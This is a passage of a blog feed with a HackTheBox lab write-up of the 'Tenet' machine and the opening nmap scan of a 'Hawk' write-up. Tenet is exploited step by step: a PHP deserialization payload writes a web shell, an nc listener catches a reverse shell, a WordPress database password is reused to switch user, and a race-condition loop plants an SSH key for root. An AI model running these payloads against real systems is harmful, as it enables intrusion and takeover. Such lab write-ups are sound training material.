&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at tenet.htb Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<ul>
  <li>If we try setting the <code class="language-plaintext highlighter-rouge">IP</code> we can see that the situation changes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> http://10.10.10.223/sator.php
<span class="o">[</span>+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;
</code></pre></div></div>

<ul>
  <li>Something that was mentioned in the comments was about a <code class="language-plaintext highlighter-rouge">backup</code> so if we add to the path we have <code class="language-plaintext highlighter-rouge">.bak</code> we see that it exists as such.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> http://10.10.10.223/sator.php.bak
&lt;?php

class DatabaseExport
<span class="o">{</span>
	public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
	public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

	public <span class="k">function </span>update_db<span class="o">()</span>
	<span class="o">{</span>
		<span class="nb">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
		<span class="nv">$this</span>-&gt; data <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
	<span class="o">}</span>


	public <span class="k">function </span>__destruct<span class="o">()</span>
	<span class="o">{</span>
		file_put_contents<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/'</span> <span class="nb">.</span> <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
		<span class="nb">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
	//	<span class="nb">echo</span> <span class="s1">'Gotta get this working properly...'</span><span class="p">;</span>
	<span class="o">}</span>
<span class="o">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'arepo'</span><span class="o">]</span> ?? <span class="s1">''</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
<span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>


?&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/9.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<h1 id="php-deserialization-attack">PHP Deserialization Attack</h1>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/web10.png" />
</p>

<ul>
  <li>
    <p>Well as such they are letting us control our <code class="language-plaintext highlighter-rouge">input</code> which is processed by <strong>GET</strong> and as such is not applying sanitization and as such is employing the <code class="language-plaintext highlighter-rouge">arepo</code> parameter we are going to create a serealized data.</p>
  </li>
  <li>
    <p>We are going to create a <strong>script in php</strong> to give us the <code class="language-plaintext highlighter-rouge">serialized</code> data since by means of the <code class="language-plaintext highlighter-rouge">cmd</code> parameter we are going to execute commands.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ catn serialize.php
&lt;?php
class DatabaseExport
<span class="o">{</span>
        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'xd.php'</span><span class="p">;</span>
        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span><span class="p">;</span>
<span class="o">}</span>

<span class="nv">$pwned</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
<span class="nb">echo </span>serialize<span class="o">(</span><span class="nv">$pwned</span><span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>If we execute it we get the object <code class="language-plaintext highlighter-rouge">serealized</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ php serialize.php 2&gt;/dev/null<span class="p">;</span> <span class="nb">echo
</span>O:14:<span class="s2">"DatabaseExport"</span>:2:<span class="o">{</span>s:9:<span class="s2">"user_file"</span><span class="p">;</span>s:6:<span class="s2">"xd.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:34:<span class="s2">"&lt;?php system(</span><span class="nv">$_REQUEST</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>We are going to send it all the data through the <code class="language-plaintext highlighter-rouge">arepo</code> parameter which is not sanitized and will interpret what we pass it since it is going to be derealized.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s2">"http://10.10.10.223/sator.php"</span> <span class="nt">--data-urlencode</span> <span class="s1">'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:6:"xd.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}'</span><span class="p">;</span> <span class="nb">echo</span>
<span class="o">[</span>+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;[] Database updated &lt;br&gt;
</code></pre></div></div>

<ul>
  <li>We see that the <code class="language-plaintext highlighter-rouge">xd.php</code> file that we defined in the <code class="language-plaintext highlighter-rouge">script</code> was created correctly.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/rev.png" />
</p>

<ul>
  <li>And now we can execute commands.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/rev2.png" />
</p>

<ul>
  <li>Now we gain access to the system by sending us a <code class="language-plaintext highlighter-rouge">reverse shell</code>..</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/rev3.png" />
</p>

<ul>
  <li>Now we receive the shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223] 49860
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@tenet:/var/www/html<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@tenet:/var/www/html<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 37998 suspended  nc <span class="nt">-nlvp</span> 443
‚ùØ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 37998 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
ENTER
www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="neil-shell">neil shell</h2>

<ul>
  <li>We found credentials..</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 228
drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 <span class="nb">.</span>
drwxr-xr-x  3 www-data www-data  4096 Jul  4 00:32 ..
<span class="nt">-rw-r--r--</span>  1 www-data www-data   405 Feb  6  2020 index.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data 19915 Feb 12  2020 license.txt
<span class="nt">-rw-r--r--</span>  1 www-data www-data  7278 Jun 26  2020 readme.html
<span class="nt">-rw-r--r--</span>  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
<span class="nt">-rw-r--r--</span>  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  3185 Jan  7  2021 wp-config.php
drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 wp-content
<span class="nt">-rw-r--r--</span>  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
<span class="nt">-rw-r--r--</span>  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  3300 Feb  6  2020 wp-load.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data 49831 Nov  9  2020 wp-login.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
<span class="nt">-rw-r--r--</span>  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
&lt;?php
/<span class="k">**</span>
 <span class="k">*</span> The base configuration <span class="k">for </span>WordPress
 <span class="k">*</span>
 <span class="k">*</span> The wp-config.php creation script uses this file during the
 <span class="k">*</span> installation. You don<span class="s1">'t have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( '</span>DB_NAME<span class="s1">', '</span>wordpress<span class="s1">' );

/** MySQL database username */
define( '</span>DB_USER<span class="s1">', '</span>neil<span class="s1">' );

/** MySQL database password */
define( '</span>DB_PASSWORD<span class="s1">', '</span>Opera2112<span class="s1">' );

/** MySQL hostname */
define( '</span>DB_HOST<span class="s1">', '</span>localhost<span class="s1">' );

/** Database Charset to use in creating database tables. */
define( '</span>DB_CHARSET<span class="s1">', '</span>utf8mb4<span class="s1">' );

/** The Database Collate type. Don'</span>t change this <span class="k">if in </span>doubt. <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_COLLATE'</span>, <span class="s1">''</span> <span class="o">)</span><span class="p">;</span>

define<span class="o">(</span> <span class="s1">'WP_HOME'</span>, <span class="s1">'http://tenet.htb'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'WP_SITEURL'</span>, <span class="s1">'http://tenet.htb'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span><span class="c">#@+</span>
 <span class="k">*</span> Authentication Unique Keys and Salts.
 <span class="k">*</span>
 <span class="k">*</span> Change these to different unique phrases!
 <span class="k">*</span> You can generate these using the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span>
 <span class="k">*</span> You can change these at any point <span class="k">in </span><span class="nb">time </span>to invalidate all existing cookies. This will force all <span class="nb">users </span>to have to log <span class="k">in </span>again.
 <span class="k">*</span>
 <span class="k">*</span> @since 2.6.0
 <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'AUTH_KEY'</span>,         <span class="s1">'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc&gt;5qKr`T}(t?+`r.+`gg,Ul,=!xy6d'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'SECURE_AUTH_KEY'</span>,  <span class="s1">'x3q&amp;hwYy]:S{l;jDU0D&amp;./@]GbBz(P~}]y=3deqO1ZB/`P:GU&lt;tJ[v)4&gt;&lt;}wl_~N'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'LOGGED_IN_KEY'</span>,    <span class="s1">'JrJ_u34gQ3(x7y_Db8`9%@jq&lt;;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'NONCE_KEY'</span>,        <span class="s1">'=z0ODLKO{9K;&lt;,&lt;gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&amp;0:ajW#'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'AUTH_SALT'</span>,        <span class="s1">'*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA&lt;E5Vp#N[a{YL TY^-Q[X++u@Ab'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'SECURE_AUTH_SALT'</span>, <span class="s1">'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'LOGGED_IN_SALT'</span>,   <span class="s1">'d14m0mBP eIawFxLs@+CrJz#d(88cx4||&lt;6~_U3F=aCCiyN|]Hr{(mC5&lt; R57zmn'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'NONCE_SALT'</span>,       <span class="s1">'Srtt&amp;}(~:K(R(q(FMK&lt;}}%Zes!4%!S`V!KSk)Rlq{&gt;Y?f&amp;b`&amp;NW[INM2,a9Zm,SH'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span><span class="c">#@-*/</span>

/<span class="k">**</span>
 <span class="k">*</span> WordPress Database Table prefix.
 <span class="k">*</span>
 <span class="k">*</span> You can have multiple installations <span class="k">in </span>one database <span class="k">if </span>you give each
 <span class="k">*</span> a unique prefix. Only numbers, letters, and underscores please!
 <span class="k">*</span>/
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>

/<span class="k">**</span>
 <span class="k">*</span> For developers: WordPress debugging mode.
 <span class="k">*</span>
 <span class="k">*</span> Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
 <span class="k">*</span> It is strongly recommended that plugin and theme developers use WP_DEBUG
 <span class="k">*</span> <span class="k">in </span>their development environments.
 <span class="k">*</span>
 <span class="k">*</span> For information on other constants that can be used <span class="k">for </span>debugging,
 <span class="k">*</span> visit the documentation.
 <span class="k">*</span>
 <span class="k">*</span> @link https://wordpress.org/support/article/debugging-in-wordpress/
 <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'WP_DEBUG'</span>, <span class="nb">false</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">*</span> That<span class="s1">'s all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( '</span>ABSPATH<span class="s1">' ) ) {
	define( '</span>ABSPATH<span class="s1">', __DIR__ . '</span>/<span class="s1">' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . '</span>wp-settings.php<span class="s1">'; 
</span></code></pre></div></div>

<ul>
  <li>The credentials are for the database but as such if we try to migrate to the <code class="language-plaintext highlighter-rouge">neil</code> user we see that <code class="language-plaintext highlighter-rouge">Opera2112</code> works.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span>su neil
Password: 
neil@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">whoami
</span>neil
neil@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
neil@tenet:/var/www/html/wordpress<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<ul>
  <li>Here we can see the first flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
0b85a9967e410892bb32b0628e11989f
neil@tenet:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>We have this privilege at the <code class="language-plaintext highlighter-rouge">sudoers</code> level.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>neil on tenet:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>

User neil may run the following commands on tenet:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>If we run it we see this.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>We see this.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/enableSSH.sh
<span class="c">#!/bin/bash</span>

checkAdded<span class="o">()</span> <span class="o">{</span>

	<span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>

	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>

		/bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>

	<span class="k">else</span>

		/bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>

	<span class="k">fi</span>

<span class="o">}</span>

checkFile<span class="o">()</span> <span class="o">{</span>

	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>

		/bin/echo <span class="s2">"Error in creating key file!"</span>

		<span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi

		</span><span class="nb">exit </span>1

	<span class="k">fi</span>

<span class="o">}</span>

addKey<span class="o">()</span> <span class="o">{</span>

	<span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>

	<span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>

	/bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>

	checkFile <span class="nv">$tmpName</span>

	/bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys

	/bin/rm <span class="nv">$tmpName</span>

<span class="o">}</span>

<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
addKey
checkAdded
neil@tenet:~<span class="nv">$ </span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/web14.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/web15.png" />
</p>

<ul>
  <li>If we look at the script and execute this which stores <code class="language-plaintext highlighter-rouge">tmpName</code> it creates a temporary value.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX
/tmp/ssh-ui1c8x0m
neil@tenet:~<span class="nv">$ </span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX
/tmp/ssh-KH7vkHSO
</code></pre></div></div>

<ul>
  <li>The first thing we are going to do is to create a key pair.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ssh-keygen <span class="nt">-f</span> /root/id_rsa <span class="nt">-N</span> <span class="s2">""</span>
Generating public/private ed25519 key pair.
Your identification has been saved <span class="k">in</span> /root/id_rsa
Your public key has been saved <span class="k">in</span> /root/id_rsa.pub
The key fingerprint is:
SHA256:LL4/EFhSOqu9HhJp6tvZ64JW0lJtanWVb1PbNdMymQk root@miguelos
The key<span class="s1">'s randomart image is:
+--[ED25519 256]--+
|     ..   . E. +.|
|    ...  o   .*oo|
|    ++  . . . oo+|
|   o.*.o   + . . |
|  * = o.S . .    |
| = O ...         |
|. O o ..         |
|.o.ooo ..        |
|.o.+=+o...       |
+----[SHA256]-----+
</span></code></pre></div></div>

<ul>
  <li>Now we copy it.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>id_rsa.pub | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
</code></pre></div></div>

<ul>
  <li>And we run a loop with our public key.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do for </span>filename <span class="k">in</span> /tmp/ssh-<span class="k">*</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEiM/fMXvCoQX988QWZre1S9ZG5Kguv/ root@miguelos"</span> <span class="o">&gt;</span> <span class="nv">$filename</span><span class="p">;</span><span class="k">done</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Now from another window we connect via <strong>SSH</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ssh neil@10.10.10.223
The authenticity of host <span class="s1">'10.10.10.223 (10.10.10.223)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:atDC5N+fRDvKKwKE6Y6GZN4MdRAr5aHD24UsVrZ4+ts.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.223<span class="s1">' (ED25519) to the list of known hosts.
neil@10.10.10.223'</span>s password:
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Thu Jul  4 01:04:47 UTC 2024

  System load:  0.95               Processes:             178
  Usage of /:   15.3% of 22.51GB   Users logged <span class="k">in</span>:       0
  Memory usage: 11%                IP address <span class="k">for </span>ens160: 10.10.10.223
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list <span class="nt">--upgradable</span>


Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
neil@tenet:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
neil@tenet:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>And we execute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
</code></pre></div></div>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>After several attempts we succeeded login with ssh because it is a <code class="language-plaintext highlighter-rouge">race condition</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tenet:~# <span class="nb">cat</span> /root/root.txt
74e3750ae90e0db4c09df869028cabca 
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Hawk (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" rel="alternate" type="text/html" title="HackTheBox - Hawk (medium)" /><published>2024-07-02T00:00:00-06:00</published><updated>2024-07-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/72d59997b352994c628a2b58b022b1d0.png" />
</p>

<ul>
  <li>Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus servicios que corren en los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,5435,8082,9092 10.10.10.102 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-02 17:09 CST
Nmap scan report <span class="k">for </span>10.10.10.102
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.63
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 <span class="o">(</span>RSA<span class="o">)</span>
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
